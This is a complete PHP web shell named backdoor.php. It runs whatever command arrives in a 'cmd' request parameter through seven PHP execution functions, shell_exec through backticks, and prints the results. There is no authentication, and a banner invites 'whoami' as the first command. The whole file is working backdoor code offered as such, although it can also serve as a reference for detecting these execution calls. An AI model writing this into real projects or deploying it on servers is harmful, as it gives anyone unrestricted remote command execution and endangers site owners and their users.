<?php
// File: backdoor.php

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];

    // 1. shell_exec()
    echo "<h2>shell_exec()</h2>";
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";

    // 2. exec()
    echo "<h2>exec()</h2>";
    exec($cmd, $output, $status);
    echo "<pre>";
    print_r($output);
    echo "</pre>";

    // 3. system()
    echo "<h2>system()</h2>";
    system($cmd, $status);

    // 4. passthru()
    echo "<h2>passthru()</h2>";
    passthru($cmd, $status);

    // 5. popen()
    echo "<h2>popen()</h2>";
    $handle = popen($cmd, 'r');
    while (!feof($handle)) {
        $buffer = fgets($handle);
        echo $buffer;
    }
    pclose($handle);

    // 6. proc_open()
    echo "<h2>proc_open()</h2>";
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($cmd, $descriptorspec, $pipes);

    if (is_resource($process)) {
        while ($s = fgets($pipes[1])) {
            echo $s;
        }
        fclose($pipes[1]);
        proc_close($process);
    }

    // 7. backtick operator
    echo "<h2>backtick operator</h2>";
    $output = `$cmd`;
    echo "<pre>$output</pre>";

} else {
    echo "Here is back door. ?cmd=whoami";
}
?>
